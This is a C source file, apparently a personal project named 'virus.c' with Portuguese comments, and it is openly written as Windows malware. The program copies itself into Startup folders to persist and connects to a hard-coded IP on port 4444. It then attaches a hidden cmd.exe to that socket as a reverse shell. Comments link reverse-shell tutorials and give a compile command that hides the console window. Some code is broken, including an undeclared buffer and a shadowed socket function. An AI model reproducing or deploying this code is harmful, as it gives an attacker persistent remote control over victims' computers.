#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <string.h>

int its_first_exec(void);
SOCKET conecta(void);
void shell(SOCKET sock);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	int socket;
	char msg[] = "Owned!\n";

	if(!its_first_exec()){
		//<requestedexecutionlevel level="requireAdministrator" uiaccess="false" />
		system("copy \"virus.exe\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\virus.exe\"");
		system("copy \"virus.exe\" \"%%appdata%%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\virus.exe\"");
		//reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v AutoRun
	}

	socket = conecta(); // liga a minha maquina
	if(socket == -1)
		return 0;

	send(socket, msg, sizeof(msg), 0);

	shell(socket); // cria processo em arvore que chama cmd

	closesocket(socket); // fecha conexao

	return 0;
}


int its_first_exec(void){
    // exist
	FILE *file;
	
	if(file = fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\virus.exe", "r"))
		return 1;
	
	if(file = fopen("%%AppData%%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\virus.exe", "r"))
		return 1;
	

	return 0;
}


SOCKET conecta(void){
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 0), &wsa);
	
	int conexao;
    int porta = 4444; // port
	SOCKET sock = -1;
    char buffer[255];
	char ip_servidor[] = "192.168.1.15"; // IP address

	struct sockaddr_in servidor_addr;
	servidor_addr.sin_family = AF_INET;
	servidor_addr.sin_addr.s_addr = inet_addr(ip_servidor);
	servidor_addr.sin_port = htons(porta);

	sock = socket(AF_INET, SOCK_STREAM, 0); // IPv4, TCP
	conexao = connect(sock, (struct sockaddr *) &servidor_addr, sizeof(servidor_addr));

	if(conexao < 0){
		for(int i =0; i < 3; ++i){
			conexao = connect(sock, (struct sockaddr *) &servidor_addr, sizeof(servidor_addr));
			if(conexao >= 0)
				return sock;
		}
	}else
		return sock;
	
	return -1;
}


void shell(SOCKET sock){

	while(1){
		recv(sock, comando, sizeof(comando), 0);

		STARTUPINFO si;
		memset(&si, 0,sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = (STARTF_USESTDHANDLES);
		si.wShowWindow = SW_HIDE;
		si.hStdInput = (HANDLE) sock;
		si.hStdOutput = (HANDLE) sock;
		si.hStdError = (HANDLE) sock;
		PROCESS_INFORMATION pi;

		CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);
		
	}
}

//WINDOWS PERMISSOES
// https://stackoverflow.com/questions/31844584/is-there-an-api-call-to-prompt-user-for-uac-elevation#comment51611441_31844584
// https://docs.microsoft.com/pt-pt/windows/win32/api/fileapi/nf-fileapi-createfilea?redirectedfrom=MSDN
// https://docs.microsoft.com/pt-pt/windows/win32/secbp/asking-the-user-for-credentials?redirectedfrom=MSDN

//REVERSE SHELL
// https://h0mbre.github.io/Win32_Reverse_Shellcode/#
// http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/
//https://0xdarkvortex.dev/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/
// https://bank-security.medium.com/undetectable-c-c-reverse-shells-fab4c0ec4f15

//COMPILACAO
// gcc virus.c -o virus.exe resource.res -l ws2_32 -mwindows